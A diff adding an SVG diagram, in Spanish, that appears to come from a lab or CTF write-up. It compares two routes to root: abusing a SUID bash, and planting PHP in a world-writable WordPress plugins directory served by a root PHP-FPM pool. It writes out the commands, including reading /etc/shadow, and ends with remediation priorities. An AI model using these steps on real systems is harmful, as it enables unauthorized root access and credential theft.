@@ -1,0 +1,80 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1240 586" width="1240" height="586">
+  <style>
+    .bg{fill:#0b1120}.panel{fill:#1e293b;stroke:#334155}
+    .term{fill:#020617;stroke:#334155}
+    .ttl{fill:#f8fafc;font:700 23px 'Segoe UI',system-ui,sans-serif}
+    .sub{fill:#94a3b8;font:400 13px 'Segoe UI',system-ui,sans-serif}
+    .by{fill:#64748b;font:400 11.5px 'Segoe UI',system-ui,sans-serif}.byn{fill:#38bdf8;font:700 11.5px 'Segoe UI',system-ui,sans-serif}
+    .h{fill:#f8fafc;font:700 13.5px 'Segoe UI',system-ui,sans-serif}
+    .cmd{fill:#38bdf8;font:400 12.5px ui-monospace,Menlo,Consolas,monospace}
+    .out{fill:#94a3b8;font:400 12px ui-monospace,Menlo,Consolas,monospace}
+    .ok{fill:#22c55e;font:400 12.5px ui-monospace,Menlo,Consolas,monospace}
+    .bad{fill:#ef4444;font:700 12.5px ui-monospace,Menlo,Consolas,monospace}
+    .warn{fill:#f59e0b;font:400 12.5px ui-monospace,Menlo,Consolas,monospace}
+    .note{fill:#94a3b8;font:400 11.5px 'Segoe UI',system-ui,sans-serif}
+    .hd{fill:#f8fafc;font:700 15px 'Segoe UI',system-ui,sans-serif}
+    .tag{fill:#020617;font:700 10.5px 'Segoe UI',system-ui,sans-serif}
+  </style>
+  <rect class="bg" width="1240" height="586"/>
+  <text class="ttl" x="20" y="38">Los dos vectores de escalada, lado a lado</text>
+  <text class="sub" x="20" y="60">Ambos parten de la sesión comprometida como «usuario» (uid 1000) y concluyen en root</text>
+
+  <!-- VECTOR A -->
+  <rect class="panel" x="20" y="86" width="594" height="440" rx="12" stroke="#ef4444" stroke-width="2"/>
+  <rect x="40" y="102" width="128" height="24" rx="12" fill="#ef4444"/>
+  <text class="tag" x="54" y="117">VECTOR A · SUID</text>
+  <text class="hd" x="40" y="148">Shell SUID — el más directo</text>
+
+  <text class="h" x="40" y="176">1. Buscar binarios con bit SUID</text>
+  <rect class="term" x="40" y="188" width="554" height="52" rx="7"/>
+  <text class="cmd" x="54" y="210">$ find / -xdev -perm -4000 -type f 2&gt;/dev/null</text>
+  <text class="out" x="54" y="226" fill="#ef4444">/usr/bin/bash    ← anómalo: un shell nunca es SUID</text>
+
+  <text class="h" x="40" y="260">2. Forzar la conservación del euid con -p</text>
+  <rect class="term" x="40" y="272" width="554" height="52" rx="7"/>
+  <text class="cmd" x="54" y="294">$ /usr/bin/bash -p -c 'id'</text>
+  <text class="bad" x="54" y="310">uid=1000(usuario) ... euid=0(root)</text>
+
+  <text class="h" x="40" y="344">3. Escalar</text>
+  <rect class="term" x="40" y="356" width="554" height="78" rx="7" stroke="#14532d"/>
+  <text class="cmd" x="54" y="378">$ /usr/bin/bash -p -c 'cat /root/root.txt'</text>
+  <text class="ok" x="54" y="398">FLAG{wp2shell_cve_2026_63030_core_rce_root_99d10c8b}</text>
+  <text class="out" x="54" y="416">$ /usr/bin/bash -p -c 'head -1 /etc/shadow'</text>
+  <text class="warn" x="470" y="416">root:*:20675:…</text>
+
+  <text class="note" x="40" y="456">Requiere: 1 sola sesión SSH como usuario.</text>
+  <text class="note" x="40" y="474">No requiere: servidor web, base de datos, login de WP,</text>
+  <text class="note" x="40" y="492">ninguna vulnerabilidad de aplicación.</text>
+  <text class="note" x="40" y="512" fill="#f59e0b">Impacto: root completo, lectura y escritura.</text>
+
+  <!-- VECTOR B -->
+  <rect class="panel" x="626" y="86" width="594" height="440" rx="12" stroke="#ef4444" stroke-width="2"/>
+  <rect x="646" y="102" width="186" height="24" rx="12" fill="#f59e0b"/>
+  <text class="tag" x="660" y="117">VECTOR B · WORDPRESS</text>
+  <text class="hd" x="646" y="148">Permisos 777 + PHP-FPM como root</text>
+
+  <text class="h" x="646" y="176">1. Descubrir el vhost oculto en loopback</text>
+  <rect class="term" x="646" y="188" width="554" height="52" rx="7"/>
+  <text class="cmd" x="660" y="210">$ grep -r DocumentRoot /etc/apache2/sites-enabled/</text>
+  <text class="out" x="660" y="226" fill="#f59e0b">127.0.0.1:8080 → /var/www/wordpress</text>
+
+  <text class="h" x="646" y="260">2. Escribir PHP en un directorio 777</text>
+  <rect class="term" x="646" y="272" width="554" height="52" rx="7"/>
+  <text class="cmd" x="660" y="294">$ cp probe.php /var/www/wordpress/wp-content/plugins/</text>
+  <text class="out" x="660" y="310">drwxrwxrwx  plugins/  → escritura por cualquiera</text>
+
+  <text class="h" x="646" y="344">3. Solicitarlo: Apache lo pasa a FPM</text>
+  <rect class="term" x="646" y="356" width="554" height="78" rx="7" stroke="#14532d"/>
+  <text class="cmd" x="660" y="378">$ curl "http://127.0.0.1:8080/.../probe.php?c=id"</text>
+  <text class="bad" x="660" y="398">uid=0(root) gid=0(root) groups=0(root)</text>
+  <text class="out" x="660" y="416">pool www: user = root  → el PHP se ejecuta como root</text>
+
+  <text class="note" x="646" y="456">Requiere: vhost en loopback accesible desde la sesión.</text>
+  <text class="note" x="646" y="474">No requiere: credenciales de WordPress ni exploit de Core.</text>
+  <text class="note" x="646" y="492">Parchear las CVE de WordPress NO cierra esta vía.</text>
+  <text class="note" x="646" y="512" fill="#f59e0b">Impacto: root completo vía web interna.</text>
+
+  <!-- footer -->
+  <rect class="panel" x="20" y="540" width="1200" height="32" rx="7" fill="#7f1d1d" stroke="#ef4444"/>
+  <text class="note" x="36" y="561" fill="#fecaca">Prioridad de remediación: Vector A (1 comando) → Vector B (2 cambios de config).</text>
+</svg>
